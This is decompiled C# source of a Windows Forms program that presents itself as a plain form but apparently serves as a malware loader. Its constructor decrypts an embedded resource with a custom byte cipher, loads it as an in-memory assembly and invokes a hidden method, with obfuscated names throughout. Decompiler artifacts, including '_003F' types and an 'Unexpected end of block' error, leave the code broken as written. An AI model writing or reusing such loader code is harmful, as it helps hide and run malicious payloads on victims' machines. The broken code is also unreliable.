using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using dLadvAgB.My.Resources;

namespace dLadvAgB;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("ToolTip1")]
	private ToolTip _ToolTip1;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	private object poney;

	private object horse;

	private Assembly chocolate;

	private MethodInfo ton;

	internal virtual _003F RichTextBox1
	{
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual _003F ToolTip_0
	{
		get
		{
			return _ToolTip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolTip1 = value;
		}
	}

	internal virtual _003F WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual _003F ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		components = new Container();
		RichTextBox1 = new RichTextBox();
		ToolTip_0 = new ToolTip(components);
		WebBrowser1 = new WebBrowser();
		ListView1 = new ListView();
		((Control)this).SuspendLayout();
		object richTextBox = (object)RichTextBox1;
		Point location = new Point(453, 63);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		object richTextBox2 = (object)RichTextBox1;
		Size size = new Size(100, 96);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(0);
		((RichTextBox)RichTextBox1).set_Text("");
		object webBrowser = (object)WebBrowser1;
		location = new Point(237, 141);
		((Control)webBrowser).set_Location(location);
		object webBrowser2 = (object)WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		object webBrowser3 = (object)WebBrowser1;
		size = new Size(250, 250);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(1);
		object listView = (object)ListView1;
		location = new Point(177, 33);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		object listView2 = (object)ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(2);
		((ListView)ListView1).set_UseCompatibleStateImageBehavior(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(825, 240);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)ListView1);
		((Control)this).get_Controls().Add((Control)WebBrowser1);
		((Control)this).get_Controls().Add((Control)RichTextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public static int momo(int nb)
	{
		return nb % 256;
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				int num2 = input[i];
				int num3 = input[i + 1];
				int j = 2 * num3 - key - num2;
				int k;
				for (k = key - num2 + num3; k < 0; k += 256)
				{
				}
				for (; j < 0; j += 256)
				{
				}
				input[i] = (byte)momo(k);
				input[i + 1] = (byte)momo(j);
			}
			return input;
		}
	}

	public void pok()
	{
		if (Operators.CompareString(ton.Name, "j", false) == 0)
		{
			ton.Invoke(RuntimeHelpers.GetObjectValue(poney), (object[])horse);
		}
	}

	public Form1()
	{
		poney = null;
		horse = new object[0];
		InitializeComponent();
		byte[] rawAssembly = Decrypt((byte[])Resources.unknown_3, Conversions.ToInteger((string)Resources.unknown_2));
		chocolate = AppDomain.CurrentDomain.Load(rawAssembly);
		Type type = chocolate.GetTypes()[5];
		MethodInfo[] methods = type.GetMethods();
		for (int i = 0; i < methods.Length; i = checked(i + 1))
		{
			MethodInfo methodInfo = (ton = methods[i]);
			pok();
		}
	}

	static void u15()
	{
		/*Error: Unexpected end of block*/;
	}
}
